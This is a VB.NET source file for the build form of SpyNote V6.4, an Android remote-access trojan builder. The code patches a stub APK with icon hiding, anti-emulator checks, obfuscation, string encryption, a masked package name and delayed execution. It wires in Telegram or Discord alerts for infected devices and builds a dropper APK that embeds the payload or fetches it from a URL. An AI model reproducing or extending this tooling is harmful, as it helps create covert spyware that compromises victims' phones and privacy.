Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Linq
Imports Microsoft.VisualBasic.CompilerServices
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports System.Xml

Partial Public Class Build
    Private sGet As String
    Private colo As Color
    Private colo1 As Color

    Public Sub New()
        Me.sGet = Nothing
        Me.colo = Color.FromArgb(57, 57, 58)
        Me.colo1 = Color.FromArgb(27, 27, 28)
        Me.InitializeComponent()
    End Sub

    Private Sub Build_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Try
            If Store.Resources(1) IsNot Nothing Then
                MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\16.ico"))
            End If
        Catch
        End Try
        Me.TextBox1.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox2.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox3.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox4.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox5.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox6.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox7.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox8.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.PictureBox2.Image = Store.Bitmap_0("\Payload\b0")
        Dim flag As Boolean = False
        Dim environmentVariable As String = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User)
        If (environmentVariable IsNot Nothing) Then
            flag = If(Not My.Computer.FileSystem.DirectoryExists(environmentVariable), True, False)
        End If
        If (Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User) Is Nothing Or flag) Then
            My.Forms.JV.ShowDialog()
            If (My.Forms.JV.DialogResult <> System.Windows.Forms.DialogResult.OK) Then
                My.Forms.JV.Close()
                MyBase.Close()
            Else
                Dim text As String = Nothing
                Try
                    text = My.Forms.JV.aFileName.Text
                    text = (New FileInfo(text)).DirectoryName
                Catch exception As System.Exception
                    ProjectData.SetProjectError(exception)
                    My.Forms.JV.Close()
                    MyBase.Close()
                    ProjectData.ClearProjectError()
                End Try
                Environment.SetEnvironmentVariable("Path", text, EnvironmentVariableTarget.User)
                My.Forms.JV.Close()
            End If
        End If
        Dim str As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
        If Store.Resources(1) Is Nothing OrElse Not File.Exists(str) Then
            MessageBox.Show("Payload folder not found. Check Resources path.", "Build", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            Return
        End If
        Dim strArrays As String() = File.ReadAllLines(str)
        If strArrays.Length >= 10 Then
            Dim lastIndex As Integer = Math.Min(strArrays.Length - 1, 10)
            For num As Integer = 0 To lastIndex
                Select Case num
                        Case 0
                            If (Not File.Exists(strArrays(num))) Then
                                Dim str1 As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
                                If (File.Exists(str1)) Then
                                    Me.PictureBox1.ImageLocation = str1
                                    Me.Label1.Tag = str1
                                    Me.ThemeButton1.Tag = "0"
                                    Me.ThemeButton1.Text = "Select icon"
                                    Me.Label1.Text = "default"
                                End If
                            Else
                                Me.PictureBox1.ImageLocation = strArrays(num)
                                Me.Label1.Tag = strArrays(num)
                                Dim str2 As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
                                If (Operators.CompareString(strArrays(num), str2, False) <> 0) Then
                                    Me.ThemeButton1.Text = "Delete"
                                    Me.Label1.Text = strArrays(num)
                                    Me.ThemeButton1.Tag = "1"
                                Else
                                    Me.ThemeButton1.Text = "Select icon"
                                    Me.Label1.Text = "default"
                                    Me.ThemeButton1.Tag = "0"
                                End If
                            End If
                            Exit Select
                        Case 1
                            Me.TextBox1.Text = strArrays(num)
                            Exit Select
                        Case 2
                            Me.TextBox2.Text = strArrays(num)
                            Exit Select
                        Case 3
                            Me.TextBox3.Text = strArrays(num)
                            Exit Select
                        Case 4
                            Me.TextBox4.Text = strArrays(num)
                            Exit Select
                        Case 5
                            Me.TextBox5.Text = strArrays(num)
                            Exit Select
                        Case 6
                            Me.TextBox6.Text = strArrays(num)
                            Exit Select
                        Case 7
                            If (Operators.CompareString(strArrays(num), "null", False) <> 0) Then
                                Me.TextBox7.Enabled = True
                                Me.Pi6.Tag = "OK"
                                Me.TextBox7.Text = strArrays(num)
                            Else
                                Me.TextBox7.Enabled = False
                                Me.Pi6.Tag = "-"
                                Me.TextBox7.Text = strArrays(num)
                            End If
                            Exit Select
                        Case 8
                            Dim permFlags As String = strArrays(num)
                            If permFlags.Length > 0 AndAlso permFlags(0) = "1"c Then
                                Me.c1()
                            End If
                            If permFlags.Length > 1 AndAlso permFlags(1) = "1"c Then
                                Me.c2()
                            End If
                            If permFlags.Length > 2 AndAlso permFlags(2) = "1"c Then
                                Me.c3()
                            End If
                            If permFlags.Length > 3 AndAlso permFlags(3) = "1"c Then
                                Me.c4()
                            End If
                            If permFlags.Length > 4 AndAlso permFlags(4) = "1"c Then
                                Me.c5()
                            End If
                            Exit Select
                        Case 9
                            If (Not File.Exists(strArrays(num))) Then
                                Me.Label14.Text = ".."
                                Me.TextBox8.Enabled = False
                                Me.TextBox8.Text = ".."
                                Me.Label15.Enabled = False
                                Me.ThemeButton3.Tag = "0"
                                Me.ThemeButton3.Text = "Select File"
                            Else
                                Me.Label14.Text = strArrays(num)
                                Me.TextBox8.Enabled = True
                                Me.Label15.Enabled = True
                                Me.ThemeButton3.Tag = "1"
                                Me.ThemeButton3.Text = "Delete"
                            End If
                            Exit Select
                        Case 10
                            If (Not Operators.ConditionalCompareObjectEqual(Me.ThemeButton3.Tag, "0", False)) Then
                                Me.TextBox8.Text = strArrays(num)
                            Else
                                Me.TextBox8.Text = ".."
                            End If
                            Exit Select
                End Select
            Next
        End If
        Me.PBil.ImageLocation = String.Concat(Store.Resources(1), "\Icons\Payload\Bi.png")
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True

        ' Загружаем настройки защиты и Dropper
        LoadProtectionSettings()
        LoadProtectionUiExtras()
        RefreshStealthControlsState()
        LoadDropperSettings()
        LoadSettings()
        If Me.cbNotifyType.SelectedIndex = -1 AndAlso Me.cbNotifyType.Items.Count > 0 Then
            Me.cbNotifyType.SelectedIndex = 0
        End If
        UpdateVisibility()
    End Sub

    ' -----  DROPPER  -----
    Private Function GetDropperGroupBox() As GroupBox
        Return grpDropper_Dropper
    End Function

    Private Function IsDropperEnabled() As Boolean
        Return chkDropperMode_Dropper IsNot Nothing AndAlso chkDropperMode_Dropper.Checked
    End Function

    Private Sub SetDropperChildControlsEnabled(grp As GroupBox, enabled As Boolean)
        If grp Is Nothing Then Return
        For Each ctrl As Control In grp.Controls
            If ctrl.Name = "chkDropperMode_Dropper" Then Continue For
            ctrl.Enabled = enabled
        Next
    End Sub

    Private Sub BrowseTemplate_Click(sender As Object, e As EventArgs) Handles btnBrowseDropperTemplate.Click
        Using ofd As New OpenFileDialog()
            ofd.Filter = "APK files (*.apk)|*.apk|All files (*.*)|*.*"
            ofd.Title = "Select Dropper Template APK"
            If ofd.ShowDialog() = DialogResult.OK Then
                txtDropperTemplatePath.Text = ofd.FileName
                SaveDropperSettings()
            End If
        End Using
    End Sub

    Private Sub chkDropperMode_CheckedChanged(sender As Object, e As EventArgs) Handles chkDropperMode_Dropper.CheckedChanged
        SetDropperChildControlsEnabled(grpDropper_Dropper, chkDropperMode_Dropper.Checked)
        SaveDropperSettings()
    End Sub

    Private Sub SaveDropperSettings()
        Try
            My.Settings.DropperMode = IsDropperEnabled().ToString()
            My.Settings.TemplatePath = txtDropperTemplatePath.Text
            My.Settings.PayloadUrl = txtPayloadUrl.Text
            If cbDropperStyle.SelectedItem IsNot Nothing Then
                My.Settings.DropperStyle = cbDropperStyle.SelectedItem.ToString()
            End If
            My.Settings.EmbedPayload = chkEmbedPayload.Checked.ToString()
            My.Settings.Save()
        Catch
        End Try
    End Sub

    Private Sub LoadDropperSettings()
        Try
            Dim enabled As Boolean = False
            Boolean.TryParse(My.Settings.DropperMode, enabled)
            chkDropperMode_Dropper.Checked = enabled

            If Not String.IsNullOrWhiteSpace(My.Settings.TemplatePath) Then
                txtDropperTemplatePath.Text = My.Settings.TemplatePath
            End If
            If Not String.IsNullOrWhiteSpace(My.Settings.PayloadUrl) Then
                txtPayloadUrl.Text = My.Settings.PayloadUrl
            End If
            If Not String.IsNullOrWhiteSpace(My.Settings.DropperStyle) Then
                Dim idx As Integer = cbDropperStyle.Items.IndexOf(My.Settings.DropperStyle)
                If idx >= 0 Then cbDropperStyle.SelectedIndex = idx
            ElseIf cbDropperStyle.Items.Count > 0 AndAlso cbDropperStyle.SelectedIndex = -1 Then
                cbDropperStyle.SelectedIndex = 0
            End If
            Dim embed As Boolean = True
            Boolean.TryParse(My.Settings.EmbedPayload, embed)
            chkEmbedPayload.Checked = embed
            SetDropperChildControlsEnabled(grpDropper_Dropper, enabled)
        Catch
        End Try
    End Sub

    Private Function GetDropperConfigFromUi(packageName As String, aesKey As Byte(), appName As String, iconPath As String) As ApkDropperPatcher.DropperBuildConfig
        Dim cfg As New ApkDropperPatcher.DropperBuildConfig()
        cfg.ClientPackageName = packageName
        cfg.AesKey = aesKey
        cfg.PayloadAppName = appName
        cfg.IconPath = iconPath
        cfg.UseEncryptedFallback = True
        cfg.EmbedPayload = chkEmbedPayload.Checked
        If cbDropperStyle.SelectedItem IsNot Nothing Then cfg.Style = cbDropperStyle.SelectedItem.ToString()
        cfg.TemplateApkPath = txtDropperTemplatePath.Text.Trim()
        cfg.PayloadUrl = txtPayloadUrl.Text.Trim()
        Return cfg
    End Function

    Private Function BuildDropperApk(packageName As String, aesKey As Byte(), appName As String, iconPath As String, ByRef report As ApkDropperPatcher.DropperBuildReport) As Boolean
        Dim cfg = GetDropperConfigFromUi(packageName, aesKey, appName, iconPath)
        Return ApkDropperPatcher.TryBuildDropper(Store.Resources(1), cfg, report)
    End Function

    Private Sub StyleProtectionCheckBox(chk As CheckBox, active As Boolean)
        If chk Is Nothing Then Return
        chk.UseVisualStyleBackColor = False
        chk.ForeColor = If(active, UiTheme.TextPrimary, UiTheme.TextMuted)
    End Sub

    Private Sub StyleProtectionLabel(lbl As Label, active As Boolean)
        If lbl Is Nothing Then Return
        lbl.ForeColor = If(active, UiTheme.TextPrimary, UiTheme.TextMuted)
    End Sub

    Private Sub StyleProtectionNumeric(num As NumericUpDown, active As Boolean)
        If num Is Nothing Then Return
        num.ForeColor = If(active, UiTheme.TextPrimary, UiTheme.TextMuted)
    End Sub

    Private Sub RefreshStealthControlsState()
        Dim stealthOn As Boolean = chkStealthEnabled IsNot Nothing AndAlso chkStealthEnabled.Checked
        StyleProtectionCheckBox(chkStealthEnabled, True)
        If chkObfuscateSmali IsNot Nothing Then
            chkObfuscateSmali.Enabled = stealthOn
            StyleProtectionCheckBox(chkObfuscateSmali, stealthOn)
        End If
        If chkEncryptStrings IsNot Nothing Then
            chkEncryptStrings.Enabled = stealthOn
            StyleProtectionCheckBox(chkEncryptStrings, stealthOn)
        End If
        If chkMaskManifest IsNot Nothing Then
            chkMaskManifest.Enabled = stealthOn
            StyleProtectionCheckBox(chkMaskManifest, stealthOn)
        End If
        If chkDelayedExecution IsNot Nothing Then
            chkDelayedExecution.Enabled = stealthOn
            StyleProtectionCheckBox(chkDelayedExecution, stealthOn)
        End If
        Dim delayActive As Boolean = stealthOn AndAlso chkDelayedExecution IsNot Nothing AndAlso chkDelayedExecution.Checked
        If numDelayMinutes IsNot Nothing Then
            numDelayMinutes.Enabled = delayActive
            StyleProtectionNumeric(numDelayMinutes, delayActive)
        End If
        StyleProtectionLabel(lblDelayOptions, stealthOn)
    End Sub

    Private Sub StealthEnabled_CheckedChanged(sender As Object, e As EventArgs) Handles chkStealthEnabled.CheckedChanged, chkDelayedExecution.CheckedChanged
        RefreshStealthControlsState()
    End Sub

    Private Function GetStealthCheckbox(name As String) As Boolean
        Select Case name
            Case "chkStealthEnabled" : Return chkStealthEnabled.Checked
            Case "chkObfuscateSmali" : Return chkObfuscateSmali.Checked
            Case "chkEncryptStrings" : Return chkEncryptStrings.Checked
            Case "chkMaskManifest" : Return chkMaskManifest.Checked
            Case "chkDelayedExecution" : Return chkDelayedExecution.Checked
            Case Else : Return False
        End Select
    End Function

    Private Function GetHideIconAfterSetupChecked() As Boolean
        Return chkHideIconAfterSetup IsNot Nothing AndAlso chkHideIconAfterSetup.Checked
    End Function

    Private Function BuildPermissionFlags() As String
        Dim str As String = String.Empty
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi1.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi2.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi3.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi4.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi5.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        If Not GetHideIconAfterSetupChecked() AndAlso str.Length > 0 Then
            str = "0"c & str.Substring(1)
        End If
        Return str
    End Function

    Private Function GetProtectionConfigFromUi() As ApkProtectionPatcher.ProtectionConfig
        Dim stealthOn As Boolean = GetStealthCheckbox("chkStealthEnabled") OrElse (chkStealthEnabled IsNot Nothing AndAlso chkStealthEnabled.Checked)
        Dim delayMin As Integer = 5
        Try
            If numDelayMinutes IsNot Nothing Then delayMin = CInt(numDelayMinutes.Value)
        Catch
        End Try
        Return New ApkProtectionPatcher.ProtectionConfig With {
            .Enabled = chkEnableProtection IsNot Nothing AndAlso chkEnableProtection.Checked,
            .HideIconAfterSetup = GetHideIconAfterSetupChecked(),
            .AntiEmulator = chkAntiEmulator IsNot Nothing AndAlso chkAntiEmulator.Checked,
            .MaskType = If(cbMaskType IsNot Nothing AndAlso cbMaskType.SelectedItem IsNot Nothing, cbMaskType.SelectedItem.ToString(), String.Empty),
            .PackageName = If(txtPackageName IsNot Nothing, txtPackageName.Text.Trim(), String.Empty),
            .FakeActivity = If(txtFakeActivity IsNot Nothing, txtFakeActivity.Text.Trim(), String.Empty),
            .PermissionFlags = BuildPermissionFlags(),
            .StealthEnabled = stealthOn,
            .ObfuscateSmali = stealthOn AndAlso (GetStealthCheckbox("chkObfuscateSmali") OrElse (chkObfuscateSmali IsNot Nothing AndAlso chkObfuscateSmali.Checked)),
            .EncryptStrings = stealthOn AndAlso (GetStealthCheckbox("chkEncryptStrings") OrElse (chkEncryptStrings IsNot Nothing AndAlso chkEncryptStrings.Checked)),
            .MaskManifest = stealthOn AndAlso (GetStealthCheckbox("chkMaskManifest") OrElse (chkMaskManifest IsNot Nothing AndAlso chkMaskManifest.Checked)),
            .DelayedExecution = GetStealthCheckbox("chkDelayedExecution") OrElse (chkDelayedExecution IsNot Nothing AndAlso chkDelayedExecution.Checked),
            .DelayMinutes = delayMin,
            .DelayScreenToggles = 3,
            .DelayBatteryEvents = 1,
            .MaskPackageAlias = "com.android.support.v7"
        }
    End Function

    Private Function GetNotifyConfigFromUi() As NotifySettingsHelper.NotifyConfig
        Return New NotifySettingsHelper.NotifyConfig With {
            .Enabled = chkEnableNotify.Checked,
            .NotifyType = If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), "Telegram"),
            .TelegramToken = txtTelegramToken.Text.Trim(),
            .TelegramChatId = txtTelegramChatId.Text.Trim(),
            .DiscordWebhook = txtDiscordWebhook.Text.Trim()
        }
    End Function

    Private Function RunSlExeAndWait(slExe As String, resourcesPath As String) As ApkNotifyPatcher.SlBuildResult
        Dim result As New ApkNotifyPatcher.SlBuildResult With {.Success = False}
        Try
            Dim prereqErr As String = Nothing
            If Not ApkNotifyPatcher.EnsureSlBuildPrerequisites(resourcesPath, prereqErr) Then
                result.ErrorMessage = prereqErr
                Return result
            End If

            Dim buildStartedUtc As DateTime = DateTime.UtcNow
            Dim psi As New ProcessStartInfo() With {
                .FileName = slExe,
                .Arguments = "n -160",
                .WorkingDirectory = Path.GetDirectoryName(slExe),
                .WindowStyle = ProcessWindowStyle.Hidden,
                .UseShellExecute = True,
                .CreateNoWindow = True
            }

            Dim slProcess As Process = Process.Start(psi)
            If slProcess Is Nothing Then
                result.ErrorMessage = "Failed to start SL.exe"
                Return result
            End If

            Dim outputApk As String = ApkNotifyPatcher.WaitForSlBuildOutput(resourcesPath, 180000, buildStartedUtc)
            If ApkNotifyPatcher.IsValidApkFile(outputApk) Then
                result.Success = True
                result.OutputPath = outputApk
                Try
                    If Not slProcess.HasExited Then slProcess.CloseMainWindow()
                Catch
                End Try
                Return result
            End If

            If Not slProcess.HasExited Then
                Try
                    slProcess.WaitForExit(5000)
                Catch
                End Try
            End If

            If slProcess.HasExited AndAlso slProcess.ExitCode <> 0 Then
                result.ErrorMessage = "SL.exe exited with code " & slProcess.ExitCode.ToString()
            Else
                result.ErrorMessage = "SL.exe finished but no client APK was produced — check stub.apk, Java and apktool in Building-6.1\apktool"
            End If
            Return result
        Catch ex As Exception
            result.ErrorMessage = "SL.exe failed: " & ex.Message
            Return result
        End Try
    End Function

    Private Function FormatBuildIssue(raw As String) As String
        If String.IsNullOrWhiteSpace(raw) Then Return "Unknown build error"
        Dim text As String = raw.Trim()
        If text.StartsWith("apk patch:", StringComparison.OrdinalIgnoreCase) Then
            text = text.Substring("apk patch:".Length).Trim()
        ElseIf text.StartsWith("sign:", StringComparison.OrdinalIgnoreCase) Then
            Return "Signing failed — check Building-6.1\\apktool keys and Java"
        End If

        Dim lower As String = text.ToLowerInvariant()
        If lower.Contains("0x03") OrElse lower.Contains("invalid character") OrElse lower.Contains("недопустимым знаком") Then
            Return "Manifest patch error (AndroidManifest.xml). Rebuild — should be fixed now."
        End If
        If lower.Contains("apktool decode failed") Then
            Return "APK decode failed — install Java and check apktool.zip in Payload"
        End If
        If lower.Contains("apktool build failed") Then
            Return "APK rebuild failed — smali or manifest issue"
        End If
        If lower.Contains("java runtime not found") Then
            Return "Java not found — install JRE/JDK and add to PATH"
        End If
        Return text
    End Function

    Private Function EnsureBuildIconPath() As String
        Dim current As String = Nothing
        Try
            current = TryCast(Me.Label1.Tag, String)
        Catch
        End Try
        If Not String.IsNullOrWhiteSpace(current) AndAlso File.Exists(current) Then Return current

        Dim defaultIcon As String = Path.Combine(Store.Resources(1), "Icons", "devico", "gp.png")
        If File.Exists(defaultIcon) Then
            Me.Label1.Tag = defaultIcon
            Me.PictureBox1.ImageLocation = defaultIcon
            Me.Label1.Text = "default"
            Me.ThemeButton1.Tag = "0"
            Me.ThemeButton1.Text = "Select icon"
            Return defaultIcon
        End If
        Return String.Empty
    End Function

    Private Sub WriteBuildInf(iconPath As String)
        Dim stringBuilder As New StringBuilder()
        stringBuilder.AppendLine(If(String.IsNullOrWhiteSpace(iconPath), Path.Combine(Store.Resources(1), "Icons", "devico", "gp.png"), iconPath))
        stringBuilder.AppendLine(Me.TextBox1.Text)
        stringBuilder.AppendLine(Me.TextBox2.Text)
        stringBuilder.AppendLine(Me.TextBox3.Text)
        stringBuilder.AppendLine(Me.TextBox4.Text)
        stringBuilder.AppendLine(Me.TextBox5.Text)
        stringBuilder.AppendLine(Me.TextBox6.Text)
        stringBuilder.AppendLine(Me.TextBox7.Text)
        stringBuilder.AppendLine(BuildPermissionFlags())
        stringBuilder.AppendLine(Me.Label14.Text)
        stringBuilder.AppendLine(Me.TextBox8.Text)

        Dim payloadInf As String = Path.Combine(Store.Resources(1), "Imports", "Payload", "s.inf")
        File.WriteAllText(payloadInf, stringBuilder.ToString(), New UTF8Encoding(False))
    End Sub

    Private Sub ApplyApkNotifyPatch(notifyCfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, resourcesPath As String, packageName As String, aesKey As Byte(), appName As String, iconPath As String)
        Dim patchErrors As New List(Of String)
        Dim finalizeErr As String = Nothing
        If Not ApkNotifyPatcher.TryFinalizeSlBuild(resourcesPath, finalizeErr) Then
            patchErrors.Add(If(String.IsNullOrWhiteSpace(finalizeErr), "Client rebuild failed after SL.exe", finalizeErr))
        End If

        Dim distApkPath As String = ApkNotifyPatcher.WaitForSlBuildOutput(resourcesPath, 5000)
        distApkPath = ApkNotifyPatcher.NormalizeDistApkPath(resourcesPath)
        Dim clientApkPath As String = ApkNotifyPatcher.EnsureClientOutputDirectory()
        Dim patchFailed As Boolean = False
        Dim patchSucceeded As Boolean = False
        Dim patchReport As ApkNotifyPatcher.NotifyPatchReport = Nothing
        Dim dropperReport As ApkDropperPatcher.DropperBuildReport = Nothing

        Dim brandingCfg As ApkBrandingPatcher.ClientBrandingConfig = ApkBrandingPatcher.BuildBrandingConfigFromUi(
            iconPath, Me.TextBox5.Text, Me.TextBox2.Text, Me.TextBox4.Text, Me.TextBox1.Text, Me.TextBox6.Text, Me.TextBox7.Text, Me.TextBox3.Text)

        Dim needPatch As Boolean = notifyCfg.Enabled OrElse
            ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg) OrElse
            (protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled) OrElse
            brandingCfg.HasContent() OrElse
            ApkBrandingPatcher.ApkContainsBrandingPlaceholders(distApkPath) OrElse
            Directory.Exists(Path.Combine(resourcesPath, "brick_smali"))

        If Not ApkNotifyPatcher.IsValidApkFile(distApkPath) Then
            patchErrors.Add("Unsigned APK not found after SL.exe build: " & distApkPath)
        ElseIf needPatch Then
            Dim patchErr As String = Nothing
            patchSucceeded = ApkNotifyPatcher.TryPatchApk(distApkPath, notifyCfg, protectionCfg, patchErr, brandingCfg, resourcesPath)
            patchReport = ApkNotifyPatcher.GetLastNotifyPatchReport()
            If Not patchSucceeded Then
                patchFailed = True
                If Not String.IsNullOrWhiteSpace(patchErr) Then
                    patchErrors.Add(FormatBuildIssue("apk patch: " & patchErr))
                End If
                Dim bakPath As String = distApkPath & ".notify.bak"
                If File.Exists(bakPath) Then
                    Try
                        File.Copy(bakPath, distApkPath, True)
                    Catch
                    End Try
                End If
            End If
        Else
            patchSucceeded = True
        End If

        If notifyCfg.Enabled AndAlso patchSucceeded AndAlso patchReport IsNot Nothing AndAlso Not ApkNotifyPatcher.HasNotifyEntryPoint(patchReport) Then
            patchErrors.Add("APK notify: no entry point found (provider/launcher/application)")
        ElseIf notifyCfg.Enabled AndAlso patchSucceeded AndAlso patchReport IsNot Nothing AndAlso Not patchReport.LauncherHookApplied AndAlso Not patchReport.ApplicationHookApplied AndAlso patchReport.ProviderInManifest Then
            ' Provider-only bootstrap is valid; no extra warning.
        End If

        Dim signErr As String = Nothing
        If File.Exists(distApkPath) AndAlso Not ApkNotifyPatcher.TrySignDistToClient(signErr, resourcesPath) Then
            patchErrors.Add(FormatBuildIssue("sign: " & signErr))
        ElseIf File.Exists(clientApkPath) AndAlso Not ApkNotifyPatcher.ApkLooksSigned(clientApkPath) Then
            patchErrors.Add("Client APK built but signature missing — check SignApk.jar in Building-6.1\\apktool")
        End If

        If IsDropperEnabled() AndAlso ApkNotifyPatcher.IsValidApkFile(clientApkPath) Then
            BuildDropperApk(packageName, aesKey, appName, iconPath, dropperReport)
        ElseIf IsDropperEnabled() Then
            dropperReport = New ApkDropperPatcher.DropperBuildReport With {
                .Success = False,
                .Errors = New List(Of String) From {"Client APK not found or invalid — build client first"}
            }
        End If

        Dim apkSizeKb As Long = 0
        If File.Exists(clientApkPath) Then
            apkSizeKb = New FileInfo(clientApkPath).Length \ 1024
        End If

        Dim summary As New BuildResultSummary With {
            .Success = patchErrors.Count = 0 AndAlso ApkNotifyPatcher.IsValidApkFile(clientApkPath) AndAlso (Not IsDropperEnabled() OrElse (dropperReport IsNot Nothing AndAlso dropperReport.Success)),
            .ApkPath = clientApkPath,
            .ApkSizeKb = apkSizeKb,
            .NotifyEnabled = notifyCfg.Enabled,
            .NotifyType = If(notifyCfg.NotifyType, "Telegram"),
            .NotifyCredentialsOk = DeviceNotifyService.NotifyCredentialsConfigured(notifyCfg),
            .NotifyInApk = ApkNotifyPatcher.ApkContainsNotifyCode(clientApkPath),
            .PanelNotifyEnabled = notifyCfg.Enabled,
            .ProtectionEnabled = protectionCfg IsNot Nothing AndAlso protectionCfg.Enabled,
            .AntiEmulator = protectionCfg IsNot Nothing AndAlso protectionCfg.AntiEmulator,
            .HideIcon = protectionCfg IsNot Nothing AndAlso protectionCfg.HideIconAfterSetup,
            .MaskType = If(protectionCfg IsNot Nothing, protectionCfg.MaskType, String.Empty),
            .FakeActivity = ApkProtectionPatcher.ResolveFakeActivity(protectionCfg),
            .PackageName = If(protectionCfg IsNot Nothing, protectionCfg.PackageName, String.Empty),
            .DropperEnabled = IsDropperEnabled(),
            .DropperSuccess = dropperReport IsNot Nothing AndAlso dropperReport.Success,
            .DropperOutputPath = If(dropperReport IsNot Nothing, dropperReport.OutputPath, String.Empty),
            .DropperStyle = If(dropperReport IsNot Nothing, dropperReport.Style, String.Empty),
            .DropperPackage = If(dropperReport IsNot Nothing, dropperReport.DropperPackage, String.Empty),
            .PublishedClientPath = If(dropperReport IsNot Nothing, dropperReport.PublishedClientPath, String.Empty),
            .PatchFailed = patchFailed,
            .LauncherHookApplied = patchReport IsNot Nothing AndAlso patchReport.LauncherHookApplied,
            .ApplicationHookApplied = patchReport IsNot Nothing AndAlso patchReport.ApplicationHookApplied,
            .ProviderInManifest = patchReport IsNot Nothing AndAlso patchReport.ProviderInManifest,
            .ReceiverInManifest = patchReport IsNot Nothing AndAlso patchReport.ReceiverInManifest
        }
        summary.Errors = patchErrors
        If dropperReport IsNot Nothing AndAlso dropperReport.Errors IsNot Nothing Then
            For Each err As String In dropperReport.Errors
                summary.Errors.Add("Dropper: " & err)
            Next
        End If
        BuildResultDialog.ShowResult(Me, summary)
    End Sub

    ' ----- Переопределение методов GenerateAESKey и EncryptPayload (уже есть) -----
    ' Они уже присутствуют в вашем коде, я их не дублирую.

    ' ----- Обновлённый обработчик ThemeButton2_Click (с вызовом Dropper) -----
    Private Sub ThemeButton2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton2.Click
        Try
            ' ---- Сохраняем настройки ----
            SaveSettings()
            SaveProtectionSettings()
            SaveDropperSettings()
            NotifySettingsHelper.SaveNotifyConfig(GetNotifyConfigFromUi())
            DeviceNotifyService.ResetNotifyDedup()

            ' ---- Готовим параметры ----
            Dim protectionCfg = GetProtectionConfigFromUi()
            If Not protectionCfg.HideIconAfterSetup Then
                Me.Pi1.Tag = "-"
            Else
                Me.Pi1.Tag = "OK"
            End If

            If protectionCfg.Enabled Then
                Dim maskLabel As String = ApkProtectionPatcher.ResolveMaskLabel(protectionCfg.MaskType)
                If Not String.IsNullOrWhiteSpace(maskLabel) Then
                    Me.TextBox2.Text = maskLabel
                End If
            End If

            Dim packageName As String = txtPackageName.Text.Trim()
            If String.IsNullOrEmpty(packageName) Then
                packageName = GenerateRandomPackageName()
                txtPackageName.Text = packageName
            End If
            If protectionCfg.Enabled AndAlso Not String.IsNullOrWhiteSpace(protectionCfg.PackageName) Then
                Me.TextBox3.Text = protectionCfg.PackageName.Trim()
                packageName = protectionCfg.PackageName.Trim()
            End If
            Dim aesKey As Byte() = GenerateAESKey(packageName)
            Dim iconPath As String = EnsureBuildIconPath()
            Dim appName As String = Me.TextBox2.Text

            WriteBuildInf(iconPath)
            Dim sInfPath As String = Path.Combine(Store.Resources(1), "Imports", "Payload", "s.inf")
            Dim notifyCfg = GetNotifyConfigFromUi()
            protectionCfg.PermissionFlags = BuildPermissionFlags()

            If File.Exists(sInfPath) Then
                Dim slExe As String = String.Concat(Store.Resources(1), "\Imports\Payload\SL.exe")
                Dim slResult As ApkNotifyPatcher.SlBuildResult = Nothing
                If File.Exists(slExe) Then
                    slResult = RunSlExeAndWait(slExe, Store.Resources(1))
                Else
                    Dim failSummary As New BuildResultSummary With {
                        .Success = False,
                        .ApkPath = ApkNotifyPatcher.GetBuildingClientApkPath(),
                        .NotifyEnabled = notifyCfg.Enabled,
                        .ProtectionEnabled = protectionCfg.Enabled,
                        .DropperEnabled = IsDropperEnabled()
                    }
                    failSummary.Errors = New List(Of String) From {"SL.exe not found in Payload folder"}
                    BuildResultDialog.ShowResult(Me, failSummary)
                    Return
                End If
                If slResult Is Nothing OrElse Not slResult.Success Then
                    Dim failSummary As New BuildResultSummary With {
                        .Success = False,
                        .ApkPath = ApkNotifyPatcher.GetBuildingClientApkPath(),
                        .NotifyEnabled = notifyCfg.Enabled,
                        .ProtectionEnabled = protectionCfg.Enabled,
                        .DropperEnabled = IsDropperEnabled()
                    }
                    Dim slErr As String = If(slResult IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(slResult.ErrorMessage),
                        slResult.ErrorMessage,
                        "SL.exe build failed — check Java, stub.apk and Payload\s.inf")
                    failSummary.Errors = New List(Of String) From {slErr}
                    BuildResultDialog.ShowResult(Me, failSummary)
                    Return
                End If
            End If

            ApplyApkNotifyPatch(notifyCfg, protectionCfg, Store.Resources(1), packageName, aesKey, appName, iconPath)

            MyBase.Close()
        Catch ex As Exception
            MessageBox.Show("Build error: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' ----- Остальные методы (защита, нотификатор) остаются без изменений -----
    ' (Они уже есть в вашем коде)

    ' ----- Таймер -----
